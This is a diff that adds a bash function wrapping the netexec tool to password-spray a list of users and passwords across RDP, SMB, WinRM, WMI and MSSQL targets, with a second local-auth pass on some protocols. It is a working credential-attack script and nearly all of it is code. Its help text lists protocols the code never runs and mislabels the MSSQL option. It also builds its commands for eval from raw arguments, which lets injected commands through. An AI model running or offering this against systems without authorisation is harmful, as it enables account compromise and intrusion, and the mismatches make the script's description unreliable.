@@ -150,3 +150,171 @@ enumshare() {
 
     python3 "$script_path" "$@"
 }
+
+# netexec_spray: Perform password spraying across all protocols supported by netexec
+netexec_spray() {
+    # Ensure netexec (nxc) is installed
+    if ! command -v nxc &> /dev/null; then
+        echo "Error: nxc is not installed or not in PATH."
+        return 1
+    fi
+
+    # Parse arguments
+    local targets=""
+    local users=""
+    local passwords=""
+    local domain=""
+    local verbose=false
+    local output_file=""
+
+    while [[ "$#" -gt 0 ]]; do
+        case "$1" in
+            -i)
+                shift
+                targets="$1"
+                ;;
+            -u)
+                shift
+                users="$1"
+                ;;
+            -p)
+                shift
+                passwords="$1"
+                ;;
+            -d)
+                shift
+                domain="$1"
+                ;;
+            -v|--verbose)
+                verbose=true
+                ;;
+            -o)
+                shift
+                output_file="$1"
+                ;;
+            -h|--help)
+                echo "Usage: netexec_spray -i <targets|targets.txt> -u <user|users.txt> -p <password|passwords.txt> [-d <domain>] [-v|--verbose] [-o <output_file>]"
+                echo ""
+                echo "Options:"
+                echo "  -i  List of targets (space-separated IPs or file with targets)."
+                echo "  -u  User (single user or file with list of users)."
+                echo "  -p  Password (single password or file with list of passwords)."
+                echo "  -d  Domain (optional)."
+                echo "  -v, --verbose  Enable verbose output."
+                echo "  -o  Output file to save results (optional)."
+                echo ""
+                echo "This function sprays passwords across all supported protocols: ssh, rdp, ftp, smb, winrm, vnc, wmi, mssql, ldap."
+                echo ""
+                echo "Special behaviors:"
+                echo "  - Protocol 'winrm' is executed twice: once normally and once with --local-auth."
+                echo "  - Protocol 'mssql' is executed twice: once normally and once with -windows-auth."
+                echo "  - Ctrl+C skips to the next protocol."
+                return
+                ;;
+            *)
+                echo "Unknown option: $1"
+                return 1
+                ;;
+        esac
+        shift
+    done
+
+    # Ensure required arguments are provided
+    if [[ -z "$targets" || -z "$users" || -z "$passwords" ]]; then
+        echo "Error: -i (targets), -u (user), and -p (password) are required."
+        return 1
+    fi
+
+    # List of supported protocols
+    local protocols=("rdp" "smb" "winrm" "wmi" "mssql")
+
+    # Handle Ctrl+C to skip to the next protocol
+    trap 'echo "Skipping to next protocol..."; continue' SIGINT
+
+    # Iterate over each protocol and execute the command
+    for protocol in "${protocols[@]}"; do
+        echo "Running password spray for protocol: $protocol"
+
+        # Build the base command
+        local command="nxc $protocol"
+
+        if [[ -f "$targets" ]]; then
+            command+=" $targets"
+        else
+            command+=" $targets"
+        fi
+
+        if [[ -f "$users" ]]; then
+            command+=" -u $users"
+        else
+            command+=" -u $users"
+        fi
+
+        if [[ -f "$passwords" ]]; then
+            command+=" -p $passwords"
+        else
+            command+=" -p $passwords"
+        fi
+
+        if [[ -n "$domain" ]]; then
+            command+=" -d $domain"
+        fi
+
+        if [[ "$verbose" == true ]]; then
+            command+=" --verbose"
+        fi
+
+        command+=" --continue-on-success"
+
+        # Execute the command and optionally save output
+        if [[ -n "$output_file" ]]; then
+            echo "Executing: $command"
+            eval "$command" | tee -a "$output_file"
+        else
+            echo "Executing: $command"
+            eval "$command"
+        fi
+
+        # Special behavior for winrm and mssql protocols
+        if [[ "$protocol" == "winrm" ]]; then
+            echo "Running winrm with --local-auth (removing domain)"
+            local winrm_command="nxc $protocol"
+            winrm_command+=" $targets"
+            winrm_command+=" -u $users"
+            winrm_command+=" -p $passwords"
+            winrm_command+=" --continue-on-success --local-auth"
+            if [[ "$verbose" == true ]]; then
+                winrm_command+=" --verbose"
+            fi
+
+            if [[ -n "$output_file" ]]; then
+                echo "Executing: $winrm_command"
+                eval "$winrm_command" | tee -a "$output_file"
+            else
+                echo "Executing: $winrm_command"
+                eval "$winrm_command"
+            fi
+        elif [[ "$protocol" == "mssql" ]]; then
+            echo "Running mssql with -windows-auth (removing domain)"
+            local mssql_command="nxc $protocol"
+            mssql_command+=" $targets"
+            mssql_command+=" -u $users"
+            mssql_command+=" -p $passwords"
+            mssql_command+=" --continue-on-success --local-auth"
+            if [[ "$verbose" == true ]]; then
+                mssql_command+=" --verbose"
+            fi
+
+            if [[ -n "$output_file" ]]; then
+                echo "Executing: $mssql_command"
+                eval "$mssql_command" | tee -a "$output_file"
+            else
+                echo "Executing: $mssql_command"
+                eval "$mssql_command"
+            fi
+        fi
+
+    done
+
+    echo "Password spray completed for all protocols."
+}
